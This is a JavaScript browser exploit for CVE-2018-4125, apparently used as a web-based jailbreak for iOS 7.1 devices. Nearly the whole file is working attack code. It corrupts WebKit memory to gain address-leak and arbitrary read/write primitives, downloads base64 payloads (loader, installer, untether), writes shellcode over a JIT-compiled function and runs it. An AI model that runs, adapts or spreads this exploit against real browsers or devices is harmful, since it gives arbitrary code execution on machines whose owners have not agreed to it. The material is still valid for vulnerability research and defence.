/*
CVE-2018-4125 by WanderingGlitch (https://x.com/wanderingglitch)
Original exploit poc by kudima (https://github.com/kudima)
Exploit rewrite and expanded support by staturnz (https://github.com/kudima)


Original License below:
Copyright 2020, https://github.com/kudima

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

var util = undefined;
var mem = undefined;
var bootstrap = undefined;
var loader = undefined;
var installer = undefined;
var untether = undefined;
var tar = undefined;

var Utils = function() {
    this.gc_array = new Array(0x100);
    this.increase_heap = function() {
        for (var i = 0; i < this.gc_array.length; i++) {
            this.gc_array[i] = new Uint32Array(0x4000);
        }

        for (var i = 0; i < this.gc_array.length; i++) {
            var sub_array = this.gc_array[i];
            for (var j = 0; j < sub_array.length; j++) {
                sub_array[j] = 0x13371337 + j;
            }
        }

        localStorage.clear();
        sessionStorage.clear();

        for (var i = 0; i < this.gc_array.length; i++) {
            var sub_array = this.gc_array[i];
            for (var j = 0; j < sub_array.length; j++) {
                sub_array[j] = 0;
            }
            sub_array.length = 0;
        }

        for (var i = 0; i < this.gc_array.length; i++) {
            this.gc_array[i] = 0;
            this.gc_array[i].length = 0;
        }

        this.gc_array = [];
        this.gc_array.length = 0;
    }
}

var Memory = function() {
    this.u32_f64_buf = new ArrayBuffer(0x8);
    this.u32_array = new Uint32Array(this.u32_f64_buf);
    this.f64_array = new Float64Array(this.u32_f64_buf);

    this.oob_array = undefined;
    this.oob_storage = undefined;
    this.single_object = undefined;
    this.double_object = undefined;
    this.u32_rw_array = undefined;
    this.rw0_main = undefined;
    
    this.f64_to_u32 = function(value) {
        this.f64_array[0] = value;
		return [this.u32_array[0], this.u32_array[1]];
    }

    this.u32_to_f64 = function(hi, lo) {
        this.u32_array[0] = hi;
		this.u32_array[1] = lo;
		return this.f64_array[0];
    }

    this.oob_write = function(array, compare, value, index) {
        array[0] = 1.1;
		compare == 1;
        array[index] = value;
        return array[0];
    }

    this.create_oob_array = function() {
		var output = undefined;
		var array = {};
        array.p = 1.1;
		array[0] = 1.1;

        var comparison = {
            toString: function () {
				array[1000] = 2.2;
				output = [1.1];
				return '1';
			}
		};

        var value = this.u32_to_f64(0x1000, 0x1000);
        single_object = this.oob_write(array, comparison, value, 6);
		return output;
    }

    this.addr_of = function(object) {
        this.oob_array[4] = object;
		return this.oob_storage.length;
    }

    this.materialize = function(addr) {
		this.oob_storage.length = addr;
		return this.oob_array[4];
    }

    this.read32 = function(addr) {
        var lo_hi = this.f64_to_u32(this.rw0_main.rw0_f2);
        this.rw0_main.rw0_f2 = this.u32_to_f64(lo_hi[0], addr); 
        var value = this.u32_rw_array[0];
		this.rw0_main.rw0_f2 = this.u32_to_f64(lo_hi[0], lo_hi[1]); 
		return value;
    }

    this.write32 = function(addr, value) {
        var lo_hi = this.f64_to_u32(this.rw0_main.rw0_f2);
        this.rw0_main.rw0_f2 = this.u32_to_f64(lo_hi[0], addr); 
		this.u32_rw_array[0] = (value & 0xffffffff);
        this.rw0_main.rw0_f2 = this.u32_to_f64(lo_hi[0], lo_hi[1]); 
    }

    this.init_rw = function() {
        var array = {};
        array.p = 1.1;
        array[0] = 1.1; 

        for (var i = 0; i < 10000; i++) {
            this.oob_write(array, {}, 1.1, 1);
        }

        this.oob_storage = [];
        this.oob_storage[0] = 1.1;
        this.oob_array = this.create_oob_array();
        this.oob_storage[1000] = 2.2;
        this.oob_array[4] = {};

        this.double_object = [];
        for (var i = 0; i < 0x10; i++) {
            this.single_object = {
                p1:1.1, p2:2.2, p3:1.1, p4:1.1, p5:1.1, p6:1.1, p7:this.u32_to_f64(0x4141, i)
            };
            this.double_object.push(this.single_object);
        }

        var fake_obj_store = this.double_object.pop();
        var struct_leak = this.double_object.pop();
        struct_leak.rw0_f1 = 1.1;
        struct_leak.rw0_f2 = 1.1;
        struct_leak.rw0_f3 = 1.1;
        struct_leak.rw0_f4 = 1.1;

        var fake_obj_store_addr = this.addr_of(fake_obj_store);
        fake_obj_store.p6 = this.u32_to_f64(fake_obj_store_addr, 0x008015); 
        var fake_num = this.materialize(fake_obj_store_addr + 0x30);
        var num_value = Number.prototype.valueOf.call(fake_num);
        var struct_addr = this.f64_to_u32(num_value)[1];

        var array_buf = new ArrayBuffer(0x20);
        this.u32_rw_array = new Uint32Array(array_buf, 4);
        var obj_rw0 = {
            p1:this.u32_to_f64(struct_addr, this.addr_of(this.u32_rw_array) + 0x28), p2:1.1
        };

        this.rw0_main = this.materialize(this.addr_of(obj_rw0) + 0x8);
        this.single_object = {
            p1: 1.1, p2: 1.1, p3: 1.1, p4: 1.1
        };

        for (var i = 0; i < 8; i++) {
            this.read32(this.addr_of(this.single_object));
            this.write32(this.addr_of(this.single_object) + 0x8, 0);
        }
    }
}

var Data = function() {
    this.buffer = undefined;
    this.load = function(item) {
        var request = new XMLHttpRequest();
        var location = "/resources/jailbreak/" + item;
        request.open("GET", location+"?cache="  + new Date().getTime(), false);
        request.send();

        if (request.status != 200) {
            alert("Failed to download: " + item + " (" + request.status + ")");
            location.reload();
            return null;
        }

        var data = atob(request.response);
        var len = Math.floor((data.length + 4)/4) * 4;
        var bytes = new Uint8Array(len);

        for (var i = 0; i < data.length; i++) {
            bytes[i] = ((data.charCodeAt(i)) & 0xff);
        }

        this.buffer = new Uint32Array(bytes.buffer);
        return this;
    }

    this.addr = function() {
        var data_object_addr = mem.addr_of(this.buffer);
        if (data_object_addr != 0) {
            return mem.read32(data_object_addr + 0x14);
        }
        return 0;
    }

    this.size = function() {
        return (this.buffer.length * 0x4);
    }
}

function run_exploit() {
    util = new Utils();
    mem = new Memory();

    mem.init_rw();
    var test_obj = new ArrayBuffer(0x20);
    var obj_addr = mem.addr_of(test_obj);
    var bytes = mem.read32(obj_addr);

    mem.write32(obj_addr, 0x41414141);
    var read_value = mem.read32(obj_addr);
    mem.write32(obj_addr, bytes);
    if (read_value != 0x41414141) return;

    var jit_data = "var obj = {};";
	for (var i = 0; i < 100; i++) {
		jit_data += "obj.p = 1.1;";
	}

	jit_data += "if (x) alert('jit_data');";
	var jit_func = new Function('x', jit_data);
	for (var i = 0; i < 1000; i++) jit_func();
	var jit_addr = mem.read32((mem.read32(mem.addr_of(jit_func) + 0xc)) + 0x14) - 1;

    for (var i = 0; i < loader.buffer.length; i++) {
		var value = loader.buffer[i];
		mem.write32(jit_addr + (i * 0x4), value);
	}

    var info_addr = jit_addr-0x20;
    mem.write32(info_addr+0x0, installer.addr());
    mem.write32(info_addr+0x4, installer.size());
    mem.write32(info_addr+0x8, bootstrap.addr());
    mem.write32(info_addr+0xc, bootstrap.size());
    mem.write32(info_addr+0x10, untether.addr());
    mem.write32(info_addr+0x14, untether.size());
    mem.write32(info_addr+0x18, tar.addr());
    mem.write32(info_addr+0x1c, tar.size());
    jit_func(true);
}

function check_support() {
    function is_supported() {
        var user_agent = window.navigator.userAgent;
        if (/iP(hone|od touch|ad)/.test(user_agent)) {
            var array = (user_agent).match(/OS (\d+)_(\d+)_?(\d+)?/);
            var version = [parseInt(array[1], 10), parseInt(array[2], 10), parseInt(array[3] || 0, 10)];
            if (version[0] == 7 && version[1] == 1) return true;
        }
        return false;
    }

    if (!is_supported()) {
        document.getElementById("jailbreakBtn").innerHTML = "<a>Unsupported</a>";
    }
}

function download_resources() {
    document.getElementById("jailbreakBtn").textContent = "Downloading resources...";
    setTimeout(function() {
        if ((bootstrap = new Data().load("bootstrap.tar.b64")) == null) return;
        if ((loader = new Data().load("loader.b64")) == null) return;
        if ((installer = new Data().load("installer.b64")) == null) return;
        if ((untether = new Data().load("lyncis.tar.b64")) == null) return;
        if ((tar = new Data().load("tar.b64")) == null) return;

        document.getElementById("jailbreakBtn").textContent = "Installing jailbreak...";
        setTimeout(function() {
            run_exploit();
        }, 2000);
    }, 1000);
}

function start() {
    setTimeout(function() {
        download_resources();
    }, 500);
}
